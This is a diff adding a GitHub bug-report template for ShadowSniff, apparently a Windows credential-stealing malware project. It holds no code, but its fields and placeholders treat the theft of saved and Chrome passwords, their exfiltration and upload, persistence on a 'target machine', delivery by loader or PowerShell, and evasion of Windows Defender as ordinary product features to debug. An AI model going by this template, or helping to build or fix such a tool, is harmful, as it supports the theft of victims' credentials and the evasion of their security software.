@@ -1,0 +1,87 @@
+name: 🐞 Bug report
+description: Create a report to help us improve
+title: "[BUG] "
+labels:
+    - bug
+
+body:
+    - type: markdown
+      attributes:
+          value: |
+              🧐 **Guidelines:**
+
+              - Search through [existing issues](https://github.com/sqlerrorthing/ShadowSniff/issues?q=is%3Aopen+is%3Aissue) first to ensure that this bug has not been reported before.
+              - Write a descriptive title for your issue. Avoid generic or vague titles such as "Something's not working" or "A couple of problems".
+              - Keep your issue focused on one single problem. If you have multiple feature requests, please create separate issues for each of them.
+              - Provide as much context as possible in the details section. Include screenshots, screen recordings, links, references, or anything else you may consider relevant.
+
+    - type: input
+      attributes:
+          label: ShadowSniff Build/Version
+          description: Which version of ShadowSniff does this bug affect?
+          placeholder: e.g. v1.0.0
+      validations:
+          required: true
+
+    - type: textarea
+      attributes:
+          label: What happened?
+          description: |
+              Describe the bug in detail. What did you expect to happen, and what actually happened?
+              Include relevant context that could help reproduce or understand the issue.
+          placeholder: e.g. Data exfiltration succeeded, but saved passwords were missing from the archive.
+      validations:
+          required: true
+
+    - type: dropdown
+      attributes:
+          label: Operating System Details
+          description: Target system OS version and architecture
+          options:
+              - Windows 11 x64
+              - Windows 11 x32
+              - Windows 10 x64
+              - Windows 10 x32
+              - Windows 7 x64
+      validations:
+          required: true
+
+    - type: textarea
+      attributes:
+          label: Execution Context
+          description: |
+              How was ShadowSniff executed?
+              For example: manually via CMD, dropped by loader, scheduled task, etc.
+          placeholder: e.g. Dropped by downloader EXE and launched via PowerShell
+      validations:
+          required: true
+
+    - type: textarea
+      attributes:
+          label: Persistence Status
+          description: |
+              Was persistence successfully established on the target machine?
+              If not, describe what failed (e.g. registry entry not created, scheduled task not triggered).
+          placeholder: e.g. Registry persistence failed on Windows 11 Home
+      validations:
+          required: false
+
+    - type: textarea
+      attributes:
+          label: Exfiltration Behavior
+          description: |
+              Was data exfiltration successful?
+              If not, specify what data was missing, corrupted, or failed to upload.
+          placeholder: e.g. Chrome passwords were not dumped, upload failed with timeout
+      validations:
+          required: false
+
+    - type: textarea
+      attributes:
+          label: Antivirus / Defender Reaction
+          description: |
+              Did any security software block or detect ShadowSniff?
+              Please mention the AV name, version, and what was detected or blocked.
+          placeholder: e.g. Windows Defender flagged the stub on first execution
+      validations:
+          required: false
